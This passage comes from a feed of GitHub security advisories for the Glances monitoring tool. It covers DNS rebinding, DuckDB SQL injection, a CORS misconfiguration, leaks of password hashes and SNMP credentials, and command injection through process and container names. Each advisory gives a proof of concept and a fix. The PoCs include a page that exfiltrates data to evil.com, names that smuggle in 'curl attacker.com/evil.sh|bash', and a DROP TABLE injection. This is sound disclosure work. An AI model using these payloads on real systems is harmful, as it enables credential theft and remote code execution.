<p>In a live deployment, the expected verification is:</p>
<pre><code class="language-bash"># Victim-accessible Glances service
glances -w

# Attacker-controlled rebinding domain first resolves to attacker infra,
# then rebinds to the victim-local Glances IP.
# After rebind, attacker JS can fetch:
fetch("http://attacker.example:61208/api/4/status")
  .then(r =&gt; r.text())
  .then(console.log)
</code></pre>
<p>And if the operator exposes Glances without <code>--password</code> (supported and common), the attacker can read endpoints such as:</p>
<pre><code class="language-bash">GET /api/4/status
GET /api/4/all
GET /api/4/config
GET /api/4/args
GET /api/4/serverslist
</code></pre>
<p>Even on password-enabled deployments, the missing host validation still leaves the REST/WebUI/token surface reachable through rebinding and increases the value of chains with other authenticated browser issues.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Remote read of local/internal REST data:</strong> DNS rebinding can expose Glances instances that were intended to be reachable only from a local or internal network context.</li>
<li><strong>Bypass of origin-based browser isolation:</strong> Same-origin policy no longer protects the API once the browser accepts the attacker-controlled rebinding host as the origin.</li>
<li><strong>High-value chaining surface:</strong> This expands the exploitability of previously identified Glances issues involving permissive CORS, credential-bearing API responses, and state-changing authenticated endpoints.</li>
<li><strong>Token surface exposure:</strong> The JWT token route is mounted on the same host-unvalidated app and is therefore also reachable through the rebinding path.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Apply host allowlist enforcement to the main REST/WebUI FastAPI app, similar in spirit to the MCP hardening:</p>
<pre><code class="language-python">from starlette.middleware.trustedhost import TrustedHostMiddleware

allowed_hosts = config.get_list_value(
    'outputs',
    'allowed_hosts',
    default=['localhost', '127.0.0.1'],
)

self._app.add_middleware(TrustedHostMiddleware, allowed_hosts=allowed_hosts)
</code></pre>
<p>At minimum:</p>
<ul>
<li>reject requests whose <code>Host</code> header does not match an explicit allowlist</li>
<li>do not rely on <code>0.0.0.0</code> bind semantics as an access-control boundary</li>
<li>document that reverse-proxy deployments must set a strict host allowlist</li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><code>glances/outputs/glances_mcp.py</code></li>
<li><code>glances/outputs/glances_restful_api.py</code></li>
<li><code>glances/main.py</code></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-hhcg-r27j-fhv9">https://github.com/nicolargo/glances/security/advisories/GHSA-hhcg-r27j-fhv9</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/5850c564ee10804fdf884823b9c210eb954dd1f9">https://github.com/nicolargo/glances/commit/5850c564ee10804fdf884823b9c210eb954dd1f9</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-hhcg-r27j-fhv9">https://github.com/advisories/GHSA-hhcg-r27j-fhv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hhcg-r27j-fhv9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-16T16:34:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances has a SQL Injection in DuckDB Export via Unparameterized DDL Statements]]></title>
        <id>https://github.com/advisories/GHSA-49g7-2ww7-3vf5</id>
        <link href="https://github.com/advisories/GHSA-49g7-2ww7-3vf5"/>
        <updated>2026-03-16T16:34:06.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The GHSA-x46r fix (commit 39161f0) addressed SQL injection in the TimescaleDB export module by converting all SQL operations to use parameterized queries and <code>psycopg.sql</code> composable objects. However, the DuckDB export module (<code>glances/exports/glances_duckdb/__init__.py</code>) was not included in this fix and contains the same class of vulnerability: table names and column names derived from monitoring statistics are directly interpolated into SQL statements via f-strings. While DuckDB INSERT values already use parameterized queries (<code>?</code> placeholders), the DDL construction and table name references do not escape or parameterize identifier names.</p>
<h2 id="details">Details</h2>
<p>The DuckDB export module constructs SQL DDL statements by directly interpolating stat field names and plugin names into f-strings.</p>
<p><strong>Vulnerable CREATE TABLE construction</strong> (<code>glances/exports/glances_duckdb/__init__.py:156-162</code>):</p>
<pre><code class="language-python">create_query = f"""
CREATE TABLE {plugin} (
{', '.join(creation_list)}
);"""
self.client.execute(create_query)
</code></pre>
<p>The <code>creation_list</code> is built from stat dictionary keys in the <code>update()</code> method (<code>glances/exports/glances_duckdb/__init__.py:117-118</code>):</p>
<pre><code class="language-python">for key, value in plugin_stats.items():
    creation_list.append(f"{key} {convert_types[type(self.normalize(value)).__name__]}")
</code></pre>
<p>The INSERT statement also uses the unescaped <code>plugin</code> name (<code>glances/exports/glances_duckdb/__init__.py:172-174</code>):</p>
<pre><code class="language-python">insert_query = f"""
INSERT INTO {plugin} VALUES (
{', '.join(['?' for _ in values])}
);"""
</code></pre>
<p>While INSERT values use <code>?</code> placeholders (safe), the table name <code>{plugin}</code> is directly interpolated in both CREATE TABLE and INSERT INTO statements. Column names in creation_list are also directly interpolated without quoting.</p>
<p><strong>Comparison with the TimescaleDB fix (commit 39161f0):</strong></p>
<p>The TimescaleDB fix addressed this exact pattern by:</p>
<ol>
<li>Using <code>psycopg.sql.Identifier()</code> for table and column names</li>
<li>Using <code>psycopg.sql.SQL()</code> for composing queries</li>
<li>Using <code>%s</code> placeholders for all values</li>
</ol>
<p>The DuckDB module was not part of this fix despite having the same vulnerability class.</p>
<p><strong>Attack vector:</strong></p>
<p>The primary attack vector is through stat dictionary keys. While most keys come from hardcoded psutil field names (e.g., <code>cpu_percent</code>, <code>memory_usage</code>), any future plugin that introduces dynamic keys from external data (container labels, custom metrics, user-defined sensor names) would create an exploitable injection path. Additionally, the table name (<code>plugin</code>) comes from the internal plugins list, but any custom plugin with a crafted name could inject SQL.</p>
<h2 id="poc">PoC</h2>
<p>The injection is demonstrable when column or table names contain SQL metacharacters:</p>
<pre><code class="language-python"># Simulated injection via a hypothetical plugin with dynamic keys
# If a stat dict contained a key like:
#   "cpu_percent BIGINT); DROP TABLE cpu; --"
# The creation_list would produce:
#   "cpu_percent BIGINT); DROP TABLE cpu; -- VARCHAR"
# Which in the CREATE TABLE f-string becomes:
#   CREATE TABLE plugin_name (
#     time TIMETZ,
#     hostname_id VARCHAR,
#     cpu_percent BIGINT); DROP TABLE cpu; -- VARCHAR
#   );
</code></pre>
<pre><code class="language-bash"># Verify with DuckDB export enabled:
# 1. Configure DuckDB export in glances.conf:
# [duckdb]
# database=/tmp/glances.duckdb

# 2. Start Glances with DuckDB export and debug logging
glances --export duckdb --debug 2&gt;&amp;1 | grep "Create table"

# 3. Observe the unescaped SQL in debug output
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><p><strong>Defense-in-depth gap:</strong> The identical vulnerability pattern was identified and fixed in TimescaleDB (GHSA-x46r) but the fix was not applied to the sibling DuckDB module. This represents an incomplete patch that leaves the same attack surface open through a different code path.</p>
</li>
<li><p><strong>Future exploitability:</strong> If any Glances plugin is added or modified to produce stat dictionary keys from external/user-controlled data (e.g., container metadata, custom metric names, SNMP OID labels), the DuckDB export would become immediately exploitable for SQL injection without any additional code changes.</p>
</li>
<li><p><strong>Data integrity:</strong> A successful injection in the CREATE TABLE statement could corrupt the DuckDB database, create unauthorized tables, or modify schema in ways that affect other applications reading from the same database file.</p>
</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Apply the same parameterization approach used in the TimescaleDB fix. DuckDB supports identifier quoting with double quotes:</p>
<pre><code class="language-python"># glances/exports/glances_duckdb/__init__.py

def _quote_identifier(name):
    """Quote a SQL identifier to prevent injection."""
    # DuckDB uses double-quote escaping for identifiers
    return '"' + name.replace('"', '""') + '"'

def export(self, plugin, creation_list, values_list):
    """Export the stats to the DuckDB server."""
    logger.debug(f"Export {plugin} stats to DuckDB")

    table_list = [t[0] for t in self.client.sql("SHOW TABLES").fetchall()]
    if plugin not in table_list:
        # Quote table and column names to prevent injection
        quoted_plugin = _quote_identifier(plugin)
        quoted_fields = []
        for item in creation_list:
            parts = item.split(' ', 1)
            col_name = _quote_identifier(parts[0])
            col_type = parts[1] if len(parts) &gt; 1 else 'VARCHAR'
            quoted_fields.append(f"{col_name} {col_type}")

        create_query = f"CREATE TABLE {quoted_plugin} ({', '.join(quoted_fields)});"
        try:
            self.client.execute(create_query)
        except Exception as e:
            logger.error(f"Cannot create table {plugin}: {e}")
            return

    self.client.commit()

    # Insert with quoted table name
    quoted_plugin = _quote_identifier(plugin)
    for values in values_list:
        insert_query = f"INSERT INTO {quoted_plugin} VALUES ({', '.join(['?' for _ in values])});"
        try:
            self.client.execute(insert_query, values)
        except Exception as e:
            logger.error(f"Cannot insert data into table {plugin}: {e}")

    self.client.commit()
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-49g7-2ww7-3vf5">https://github.com/nicolargo/glances/security/advisories/GHSA-49g7-2ww7-3vf5</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/63b7da28895249d775202d639e5531ba63491a5c">https://github.com/nicolargo/glances/commit/63b7da28895249d775202d639e5531ba63491a5c</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-49g7-2ww7-3vf5">https://github.com/advisories/GHSA-49g7-2ww7-3vf5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49g7-2ww7-3vf5</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:34:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances's Default CORS Configuration Allows Cross-Origin Credential Theft]]></title>
        <id>https://github.com/advisories/GHSA-9jfm-9rc6-2hfq</id>
        <link href="https://github.com/advisories/GHSA-9jfm-9rc6-2hfq"/>
        <updated>2026-03-16T16:32:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The Glances REST API web server ships with a default CORS configuration that sets <code>allow_origins=["*"]</code> combined with <code>allow_credentials=True</code>. When both of these options are enabled together, Starlette's <code>CORSMiddleware</code> reflects the requesting <code>Origin</code> header value in the <code>Access-Control-Allow-Origin</code> response header instead of returning the literal <code>*</code> wildcard. This effectively grants any website the ability to make credentialed cross-origin API requests to the Glances server, enabling cross-site data theft of system monitoring information, configuration secrets, and command line arguments from any user who has an active browser session with a Glances instance.</p>
<h2 id="details">Details</h2>
<p>The CORS configuration is set up in <code>glances/outputs/glances_restful_api.py</code> lines 290-299:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py:290-299
# FastAPI Enable CORS
# https://fastapi.tiangolo.com/tutorial/cors/
self._app.add_middleware(
    CORSMiddleware,
    # Related to https://github.com/nicolargo/glances/issues/2812
    allow_origins=config.get_list_value('outputs', 'cors_origins', default=["*"]),
    allow_credentials=config.get_bool_value('outputs', 'cors_credentials', default=True),
    allow_methods=config.get_list_value('outputs', 'cors_methods', default=["*"]),
    allow_headers=config.get_list_value('outputs', 'cors_headers', default=["*"]),
)
</code></pre>
<p>The defaults are loaded from the config file, but when no config is provided (which is the common case for most deployments), the defaults are:</p>
<ul>
<li><code>cors_origins = ["*"]</code> (all origins)</li>
<li><code>cors_credentials = True</code> (allow credentials)</li>
</ul>
<p>Per the CORS specification, browsers should not send credentials when <code>Access-Control-Allow-Origin: *</code>. However, Starlette's <code>CORSMiddleware</code> implements a workaround: when <code>allow_origins=["*"]</code> and <code>allow_credentials=True</code>, the middleware reflects the requesting origin in the response header instead of using <code>*</code>. This means:</p>
<ol>
<li>Attacker hosts <code>https://evil.com/steal.html</code></li>
<li>Victim (who has authenticated to Glances via browser Basic Auth dialog) visits that page</li>
<li>JavaScript on <code>evil.com</code> makes <code>fetch("http://glances-server:61208/api/4/config", {credentials: "include"})</code></li>
<li>The browser sends the stored Basic Auth credentials</li>
<li>Starlette responds with <code>Access-Control-Allow-Origin: https://evil.com</code> and <code>Access-Control-Allow-Credentials: true</code></li>
<li>The browser allows JavaScript to read the response</li>
<li>Attacker exfiltrates the configuration including sensitive data</li>
</ol>
<p>When Glances is running <strong>without</strong> <code>--password</code> (the default for most internal network deployments), no authentication is required at all. Any website can directly read all API endpoints including system stats, process lists, configuration, and command line arguments.</p>
<h2 id="poc">PoC</h2>
<p><strong>Step 1: Attacker hosts a malicious page.</strong></p>
<pre><code class="language-html">&lt;!-- steal-glances.html hosted on attacker's server --&gt;
&lt;script&gt;
async function steal() {
  const target = "http://glances-server:61208";
  
  // Steal system stats (processes, CPU, memory, network, disk)
  const all = await fetch(target + "/api/4/all", {credentials: "include"});
  const allData = await all.json();
  
  // Steal configuration (may contain database passwords, API keys)
  const config = await fetch(target + "/api/4/config", {credentials: "include"});
  const configData = await config.json();
  
  // Steal command line args (contains password hash, SNMP creds)
  const args = await fetch(target + "/api/4/args", {credentials: "include"});
  const argsData = await args.json();
  
  // Exfiltrate to attacker
  fetch("https://evil.com/collect", {
    method: "POST",
    body: JSON.stringify({all: allData, config: configData, args: argsData})
  });
}
steal();
&lt;/script&gt;
</code></pre>
<p><strong>Step 2: Verify CORS headers (without auth, default Glances).</strong></p>
<pre><code class="language-bash"># Start Glances web server (default, no password)
glances -w

# From a different origin, verify the CORS headers
curl -s -D- -o /dev/null \
  -H "Origin: https://evil.com" \
  http://localhost:61208/api/4/all

# Expected response headers include:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
</code></pre>
<p><strong>Step 3: Verify data theft (without auth).</strong></p>
<pre><code class="language-bash">curl -s http://localhost:61208/api/4/all | python -m json.tool | head -20
curl -s http://localhost:61208/api/4/config | python -m json.tool
curl -s http://localhost:61208/api/4/args | python -m json.tool
</code></pre>
<p><strong>Step 4: With authentication enabled, verify CORS still allows cross-origin credentialed requests.</strong></p>
<pre><code class="language-bash"># Start Glances with password
glances -w --password

# Preflight request with credentials
curl -s -D- -o /dev/null \
  -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  http://localhost:61208/api/4/all

# Expected: Access-Control-Allow-Origin: https://evil.com
# Expected: Access-Control-Allow-Credentials: true
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><p><strong>Without <code>--password</code> (default):</strong> Any website visited by a user on the same network can silently read all Glances API endpoints, including complete system monitoring data (process list with command lines, CPU/memory/disk stats, network interfaces and IP addresses, filesystem mounts, Docker container info), configuration file contents (which may contain database passwords, export backend credentials, API keys), and command line arguments.</p>
</li>
<li><p><strong>With <code>--password</code>:</strong> If the user has previously authenticated via the browser's Basic Auth dialog (which caches credentials), any website can make cross-origin requests that carry those cached credentials. This allows exfiltration of all the above data plus the password hash itself (via <code>/api/4/args</code>).</p>
</li>
<li><p><strong>Network reconnaissance:</strong> An attacker can use this to map internal network infrastructure by having victims visit a page that probes common Glances ports (61208) on internal IPs.</p>
</li>
<li><p><strong>Chained with POST endpoints:</strong> The CORS policy also allows <code>POST</code> methods, enabling an attacker to clear event logs (<code>/api/4/events/clear/all</code>) or modify process monitoring (<code>/api/4/processes/extended/{pid}</code>).</p>
</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Change the default CORS credentials setting to <code>False</code>, and when credentials are enabled, require explicit origin configuration instead of wildcard:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py

# Option 1: Change default to not allow credentials with wildcard origins
cors_origins = config.get_list_value('outputs', 'cors_origins', default=["*"])
cors_credentials = config.get_bool_value('outputs', 'cors_credentials', default=False)  # Changed from True

# Option 2: Reject the insecure combination at startup
if cors_origins == ["*"] and cors_credentials:
    logger.warning(
        "CORS: allow_origins='*' with allow_credentials=True is insecure. "
        "Setting allow_credentials to False. Configure specific origins to enable credentials."
    )
    cors_credentials = False

self._app.add_middleware(
    CORSMiddleware,
    allow_origins=cors_origins,
    allow_credentials=cors_credentials,
    allow_methods=config.get_list_value('outputs', 'cors_methods', default=["GET"]),  # Also restrict methods
    allow_headers=config.get_list_value('outputs', 'cors_headers', default=["*"]),
)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-9jfm-9rc6-2hfq">https://github.com/nicolargo/glances/security/advisories/GHSA-9jfm-9rc6-2hfq</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/4465169b71d93991f1e49740fe02428291099832">https://github.com/nicolargo/glances/commit/4465169b71d93991f1e49740fe02428291099832</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-9jfm-9rc6-2hfq">https://github.com/advisories/GHSA-9jfm-9rc6-2hfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9jfm-9rc6-2hfq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:32:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances has Incomplete Secrets Redaction: /api/v4/args Endpoint Leaks Password Hash and SNMP Credentials]]></title>
        <id>https://github.com/advisories/GHSA-cvwp-r2g2-j824</id>
        <link href="https://github.com/advisories/GHSA-cvwp-r2g2-j824"/>
        <updated>2026-03-16T16:26:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The GHSA-gh4x fix (commit 5d3de60) addressed unauthenticated configuration secrets exposure on the <code>/api/v4/config</code> endpoints by introducing <code>as_dict_secure()</code> redaction. However, the <code>/api/v4/args</code> and <code>/api/v4/args/{item}</code> endpoints were not addressed by this fix. These endpoints return the complete command-line arguments namespace via <code>vars(self.args)</code>, which includes the password hash (salt + pbkdf2_hmac), SNMP community strings, SNMP authentication keys, and the configuration file path. When Glances runs without <code>--password</code> (the default), these endpoints are accessible without any authentication.</p>
<h2 id="details">Details</h2>
<p>The secrets exposure fix (GHSA-gh4x, commit 5d3de60) modified three config-related endpoints to use <code>as_dict_secure()</code> when no password is configured:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py:1168 (FIXED)
args_json = self.config.as_dict() if self.args.password else self.config.as_dict_secure()
</code></pre>
<p>However, the <code>_api_args</code> and <code>_api_args_item</code> endpoints were not part of this fix and still return all arguments without any sanitization:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py:1222-1237
def _api_args(self):
    try:
        # Get the RAW value of the args dict
        # Use vars to convert namespace to dict
        args_json = vars(self.args)
    except Exception as e:
        raise HTTPException(status.HTTP_404_NOT_FOUND, f"Cannot get args ({str(e)})")

    return GlancesJSONResponse(args_json)
</code></pre>
<p>And the item-specific endpoint:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py:1239-1258
def _api_args_item(self, item: str):
    ...
    args_json = vars(self.args)[item]
    return GlancesJSONResponse(args_json)
</code></pre>
<p>The <code>self.args</code> namespace contains sensitive fields set during initialization in <code>glances/main.py</code>:</p>
<ol>
<li><p><strong><code>password</code></strong> (line 806-819): When <code>--password</code> is used, this contains the salt + pbkdf2_hmac hash. An attacker can use this for offline brute-force attacks.</p>
</li>
<li><p><strong><code>snmp_community</code></strong> (line 445): Default <code>"public"</code>, but may be set to a secret community string for SNMP monitoring.</p>
</li>
<li><p><strong><code>snmp_user</code></strong> (line 448): SNMP v3 username, default <code>"private"</code>.</p>
</li>
<li><p><strong><code>snmp_auth</code></strong> (line 450): SNMP v3 authentication key, default <code>"password"</code> but typically set to a secret value.</p>
</li>
<li><p><strong><code>conf_file</code></strong> (line 198): Path to the configuration file, reveals filesystem structure.</p>
</li>
<li><p><strong><code>username</code></strong> (line 430/800): The Glances authentication username.</p>
</li>
</ol>
<p>Both endpoints are registered on the authenticated router (line 504-505):</p>
<pre><code class="language-python">f'{base_path}/args': self._api_args,
f'{base_path}/args/{{item}}': self._api_args_item,
</code></pre>
<p>When <code>--password</code> is not set (the default), the router has NO authentication dependency (line 479-480), making these endpoints completely unauthenticated:</p>
<pre><code class="language-python">if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)
</code></pre>
<h2 id="poc">PoC</h2>
<p><strong>Scenario 1: No password configured (default deployment)</strong></p>
<pre><code class="language-bash"># Start Glances in web server mode (default, no password)
glances -w

# Access all command line arguments without authentication
curl -s http://localhost:61208/api/4/args | python -m json.tool

# Expected output includes sensitive fields:
# "password": "",
# "snmp_community": "public",
# "snmp_user": "private",
# "snmp_auth": "password",
# "username": "glances",
# "conf_file": "/home/user/.config/glances/glances.conf",

# Access specific sensitive argument
curl -s http://localhost:61208/api/4/args/snmp_community
curl -s http://localhost:61208/api/4/args/snmp_auth
</code></pre>
<p><strong>Scenario 2: Password configured (authenticated deployment)</strong></p>
<pre><code class="language-bash"># Start Glances with password authentication
glances -w --password --username admin

# Authenticate and access args (password hash exposed to authenticated users)
curl -s -u admin:mypassword http://localhost:61208/api/4/args/password
# Returns the salt$pbkdf2_hmac hash which enables offline brute-force
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><p><strong>Unauthenticated network reconnaissance:</strong> When Glances runs without <code>--password</code> (the common default for internal/trusted networks), anyone who can reach the web server can enumerate SNMP credentials, usernames, file paths, and all runtime configuration.</p>
</li>
<li><p><strong>Offline password cracking:</strong> When authentication is enabled, an authenticated user can retrieve the password hash (salt + pbkdf2_hmac) and perform offline brute-force attacks. The hash uses pbkdf2_hmac with SHA-256 and 100,000 iterations (see <code>glances/password.py:45</code>), which provides some protection but is still crackable with modern hardware.</p>
</li>
<li><p><strong>Lateral movement:</strong> Exposed SNMP community strings and v3 authentication keys can be used to access other network devices monitored by the Glances instance.</p>
</li>
<li><p><strong>Supply chain for CORS attack:</strong> Combined with the default CORS misconfiguration (finding 001), these secrets can be stolen cross-origin by a malicious website.</p>
</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Apply the same redaction pattern used for the <code>/api/v4/config</code> endpoints:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py

_SENSITIVE_ARGS = frozenset({
    'password', 'snmp_community', 'snmp_user', 'snmp_auth',
    'conf_file', 'password_prompt', 'username_used',
})

def _api_args(self):
    try:
        args_json = vars(self.args).copy()
        if not self.args.password:
            for key in _SENSITIVE_ARGS:
                if key in args_json:
                    args_json[key] = "********"
        # Never expose the password hash, even to authenticated users
        if 'password' in args_json and args_json['password']:
            args_json['password'] = "********"
    except Exception as e:
        raise HTTPException(status.HTTP_404_NOT_FOUND, f"Cannot get args ({str(e)})")
    return GlancesJSONResponse(args_json)

def _api_args_item(self, item: str):
    if item not in self.args:
        raise HTTPException(status.HTTP_400_BAD_REQUEST, f"Unknown argument item {item}")
    try:
        if item in _SENSITIVE_ARGS:
            if not self.args.password:
                return GlancesJSONResponse("********")
            if item == 'password':
                return GlancesJSONResponse("********")
        args_json = vars(self.args)[item]
    except Exception as e:
        raise HTTPException(status.HTTP_404_NOT_FOUND, f"Cannot get args item ({str(e)})")
    return GlancesJSONResponse(args_json)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-cvwp-r2g2-j824">https://github.com/nicolargo/glances/security/advisories/GHSA-cvwp-r2g2-j824</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/ff14eb9780ee10ec018c754754b1c8c7bfb6c44f">https://github.com/nicolargo/glances/commit/ff14eb9780ee10ec018c754754b1c8c7bfb6c44f</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-cvwp-r2g2-j824">https://github.com/advisories/GHSA-cvwp-r2g2-j824</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cvwp-r2g2-j824</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:26:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances has a Command Injection via Process Names in Action Command Templates]]></title>
        <id>https://github.com/advisories/GHSA-vcv2-q258-wrg7</id>
        <link href="https://github.com/advisories/GHSA-vcv2-q258-wrg7"/>
        <updated>2026-03-16T16:26:25.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The Glances action system allows administrators to configure shell commands that execute when monitoring thresholds are exceeded. These commands support Mustache template variables (e.g., <code>{{name}}</code>, <code>{{key}}</code>) that are populated with runtime monitoring data. The <code>secure_popen()</code> function, which executes these commands, implements its own pipe, redirect, and chain operator handling by splitting the command string before passing each segment to <code>subprocess.Popen(shell=False)</code>. When a Mustache-rendered value (such as a process name, filesystem mount point, or container name) contains pipe, redirect, or chain metacharacters, the rendered command is split in unintended ways, allowing an attacker who controls a process name or container name to inject arbitrary commands.</p>
<h2 id="details">Details</h2>
<p><strong>The action execution flow:</strong></p>
<ol>
<li>Admin configures an action in glances.conf (documented feature):</li>
</ol>
<pre><code class="language-ini">[cpu]
critical_action=echo "High CPU on {{name}}" | mail admin@example.com
</code></pre>
<ol start="2">
<li>When the threshold is exceeded, the plugin model renders the template with runtime stats (glances/plugins/plugin/model.py:943):</li>
</ol>
<pre><code class="language-python">self.actions.run(stat_name, trigger, command, repeat, mustache_dict=mustache_dict)
</code></pre>
<ol start="3">
<li><p>The mustache_dict contains the full stat dictionary, including user-controllable fields like process name, filesystem mnt_point, container name, etc. (glances/plugins/plugin/model.py:920-943).</p>
</li>
<li><p>In glances/actions.py:77-78, the Mustache library renders the template:</p>
</li>
</ol>
<pre><code class="language-python">if chevron_tag:
    cmd_full = chevron.render(cmd, mustache_dict)
</code></pre>
<ol start="5">
<li>The rendered command is passed to secure_popen() (glances/actions.py:84):</li>
</ol>
<pre><code class="language-python">ret = secure_popen(cmd_full)
</code></pre>
<p><strong>The secure_popen vulnerability</strong> (glances/secure.py:17-30):</p>
<pre><code class="language-python">def secure_popen(cmd):
    ret = ""
    for c in cmd.split("&amp;&amp;"):
        ret += __secure_popen(c)
    return ret
</code></pre>
<p>And __secure_popen() (glances/secure.py:33-77) splits by &gt; and | then calls Popen(sub_cmd_split, shell=False) for each segment. The function splits the ENTIRE command string (including Mustache-rendered user data) by &amp;&amp;, &gt;, and | characters, then executes each segment as a separate subprocess.</p>
<p>Additionally, the redirect handler at line 69-72 writes to arbitrary file paths:</p>
<pre><code class="language-python">if stdout_redirect is not None:
    with open(stdout_redirect, "w") as stdout_redirect_file:
        stdout_redirect_file.write(ret)
</code></pre>
<h2 id="poc">PoC</h2>
<p><strong>Scenario 1: Command injection via pipe in process name</strong></p>
<pre><code class="language-bash"># 1. Admin configures processlist action in glances.conf:
# [processlist]
# critical_action=echo "ALERT: {{name}} used {{cpu_percent}}% CPU" &gt;&gt; /tmp/alerts.log

# 2. Attacker creates a process with a crafted name containing a pipe:
cp /bin/sleep "/tmp/innocent|curl attacker.com/evil.sh|bash"
"/tmp/innocent|curl attacker.com/evil.sh|bash" 9999 &amp;

# 3. When the process triggers a critical alert, secure_popen splits by |:
#   Command 1: echo "ALERT: innocent
#   Command 2: curl attacker.com/evil.sh   &lt;-- INJECTED
#   Command 3: bash used 99% CPU" &gt;&gt; /tmp/alerts.log
</code></pre>
<p><strong>Scenario 2: Command chain via &amp;&amp; in container name</strong></p>
<pre><code class="language-bash"># 1. Admin configures containers action:
# [containers]
# critical_action=docker stats {{name}} --no-stream

# 2. Attacker names a Docker container with &amp;&amp; injection:
docker run --name "web &amp;&amp; curl attacker.com/rev.sh | bash &amp;&amp; echo " nginx

# 3. secure_popen splits by &amp;&amp;:
#   Command 1: docker stats web
#   Command 2: curl attacker.com/rev.sh | bash   &lt;-- INJECTED
#   Command 3: echo --no-stream
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><p><strong>Arbitrary command execution:</strong> An attacker who can control a process name, container name, filesystem mount point, or other monitored entity name can execute arbitrary commands as the Glances process user (often root).</p>
</li>
<li><p><strong>Privilege escalation:</strong> If Glances runs as root (common for full system monitoring), a low-privileged user who can create processes can escalate to root.</p>
</li>
<li><p><strong>Arbitrary file write:</strong> The &gt; redirect handling in secure_popen enables writing arbitrary content to arbitrary file paths.</p>
</li>
<li><p><strong>Preconditions:</strong> Requires admin-configured action templates referencing user-controllable fields + attacker ability to run processes on monitored system.</p>
</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Sanitize Mustache-rendered values before secure_popen processes them:</p>
<pre><code class="language-python"># glances/actions.py

def _escape_for_secure_popen(value):
    """Escape characters that secure_popen treats as operators."""
    if not isinstance(value, str):
        return value
    value = value.replace("&amp;&amp;", " ")
    value = value.replace("|", " ")
    value = value.replace("&gt;", " ")
    return value

def run(self, stat_name, criticality, commands, repeat, mustache_dict=None):
    for cmd in commands:
        if chevron_tag:
            if mustache_dict:
                safe_dict = {
                    k: _escape_for_secure_popen(v) if isinstance(v, str) else v
                    for k, v in mustache_dict.items()
                }
            else:
                safe_dict = mustache_dict
            cmd_full = chevron.render(cmd, safe_dict)
        else:
            cmd_full = cmd
        ...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-vcv2-q258-wrg7">https://github.com/nicolargo/glances/security/advisories/GHSA-vcv2-q258-wrg7</a></li>
